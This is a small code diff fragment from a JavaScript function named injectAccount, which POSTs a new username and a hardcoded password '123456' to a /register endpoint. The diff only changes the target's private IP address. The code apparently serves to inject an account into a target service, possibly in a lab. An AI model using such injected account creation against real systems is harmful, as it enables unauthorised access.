@@ -6,7 +6,7 @@ function injectAccount() {
     const password = '123456';
 
     const params = `new_account=${encodeURIComponent(username)}&new_password=${encodeURIComponent(password)}`;
-    xhr.open('POST', 'http://100.70.161.132:5000/register', true);
+    xhr.open('POST', 'http://192.168.160.242:5000/register', true);
     xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
     xhr.send(params);
 
